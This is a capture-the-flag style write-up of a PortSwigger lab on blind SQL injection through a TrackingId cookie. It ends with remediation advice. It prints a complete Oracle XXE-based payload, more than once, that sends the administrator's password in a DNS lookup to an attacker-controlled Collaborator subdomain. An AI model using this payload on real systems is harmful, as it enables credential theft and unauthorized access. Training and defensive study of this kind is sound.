## Metadata

- **Difficulty:** Practitioner
- **Category:** SQL Injection
- **Lab URL:** [Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
- **Date Solved:** 15/4/2026
## Vulnerability Summary

The app is vulnerable to SQL injection via its tracking cookie. The `TrackingId` cookie value is concatenated directly into a backend SQL query without sanitization. The app appears to execute SQL query asynchronously, so the app's response does not depend on the query returning any data, a database error occurring, or on the time taken to execute the query and return the response. We can still however trigger out-of-band network interactions to a domain in our control with Burp Suite Collaborator in order to exfiltrate sensitive data.
## Reconnaissance

When interacting with the application, the server issues a `TrackingId` cookie. Subjecting this cookie to standard SQLi checks reveals the following:
- Injecting standard string terminators (`'`, `''`) gives identical `200 OK` HTTP Response, ruling out straightforward error-based SQLi
- Injecting boolean conditions (`' AND 1=1--` vs `' AND 1=0--`) results in identical HTTP 200 OK responses with no variations in content length or DOM structure, ruling out boolean-based blind SQLi.
- Injecting time-delay payloads also yields no difference in server response times, indicating the query is likely executed asynchronously in a separate background thread.
- Injecting the DNS lookup query for Oracle database `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//yourdomainstring.burpcollaborator.net">+%25remote%3B]>'),'/l')+FROM dual--` yields some DNS lookups received by the Collaborator subdomain generated. This confirms that the app is vulnerable to OAST Blind SQLi technique.
## Exploitation Steps

1. Click on any category under the "Refine your search" to get a legitimate, usable cookie `TrackingID`. Intercept this request with Burp Suite proxy, and send the request to Burp Suite Repeater
2. In Burp Suite, on the **Collaborator** tab, click on **Copy to clipboard**. This will generate you a unique subdomain and poll the Collaborator server to confirm whenever a lookup occur. Paste this domain somewhere to use later. Note that you will need to change the suffix to `burpcollaborator.net` to fulfill the lab requirement (using Burp Collaborator's default public server)
3. Inject the payload `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.yourdomainstring.burpcollaborator.net/">+%25remote%3B]>'),'/l')+FROM+dual--` into the `TrackingId` cookie field. The HTTP response will be a `200 OK`. (Note that the table name, the column names, and the exact username to exploit `administrator` are given by the lab's description).
4. Come back to the **Collaborator** tab. Click on **Poll now**. You should see some DNS lookups received by the Collaborator subdomain that you generated earlier. The password for the `administrator` user is prepended to your subdomain. Simply use this password with the username `administrator`, and you should be logged in. 
## Payload Used

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3Fxml+version%3D"1.0"+encoding%3D"UTF-8"%3F><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3A//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.yourdomainstring.burpcollaborator.net/">+%25remote%3B]>'),'/l')+FROM+dual--`

- `UNION` to attach our injected `SELECT` statement to the original query.
- URL encode characters that have special syntactic meaning in the HTTP request: `?`, `:`, `=`, ` ` (whitespace), `%`.
- This payload utilizes Oracle's `xmltype()` and `EXTRACTVALUE` functions to parse a maliciously crafted XML string. The XML contains an external entity (`SYSTEM`) declaration. Using the string concatenation operator (`||`), the result of the embedded SQL subquery (the administrator's password) is prepended to an attacker-controlled Burp Collaborator subdomain. When the database parses the XML, it immediately resolves the entity, sending a DNS query containing the exfiltrated password to the Collaborator server.
## Root Cause

User-controlled input is concatenated into a SQL query with no escaping or parameterization.
## Remediation

1. Parameterized queries (prepared statement). Example secure implementation:
```java
String query = "SELECT tracking_data FROM tracking_table WHERE tracking_id = ?"; PreparedStatement pstmt = connection.prepareStatement(query); 
pstmt.setString(1, cookie.getValue()); 
resultSet = pstmt.executeQuery();
```
2. Adopting Principle of Least Privilege (PoLP). Account with user privilege should not have network permissions necessary to resolve external HTTP/DNS requests unless strictly required.